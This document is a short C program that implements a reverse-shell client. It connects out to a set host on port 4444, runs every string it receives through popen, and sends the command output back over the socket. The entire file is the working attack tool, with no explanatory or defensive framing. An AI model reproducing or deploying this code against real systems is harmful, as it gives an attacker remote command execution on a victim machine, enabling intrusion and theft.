#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define HOST "0.0.0.0"  // Host that the client will try to connect to
#define PORT 4444       // Port that the client will try to connect to
#define BUFFER_SIZE 1024

int main(void) {
    int fd;
    char buffer[BUFFER_SIZE], output[BUFFER_SIZE];
    struct sockaddr_in serverAddress;

    serverAddress.sin_family = AF_INET;
    serverAddress.sin_addr.s_addr = inet_addr(HOST);
    serverAddress.sin_port = htons(PORT);

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd == -1) {
        perror("socket");
        return 1;
    }

    if (connect(fd, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) == -1) {
        perror("connect");
        close(fd);
        return 1;
    }

    while (1) {
        ssize_t bytesRead = recv(fd, buffer, sizeof(buffer) - 1, 0);
        if (bytesRead == -1) {
            perror("recv");
            break;
        } else if (bytesRead == 0) {
            printf("Server closed the connection\n");
            break;
        }

        buffer[bytesRead] = '\0';

        FILE* fp = popen(buffer, "r");
        if (fp == NULL) {
            printf("Failed to run command\n");
            continue;
        }

        memset(output, 0, sizeof(output));
        size_t bytesReadOutput = fread(output, sizeof(char), sizeof(output) - 1, fp);
        pclose(fp);

        if (bytesReadOutput > 0) {
            if (send(fd, output, bytesReadOutput, 0) == -1) {
                perror("send");
                break;
            }
        }
    }

    close(fd);
    return 0;
}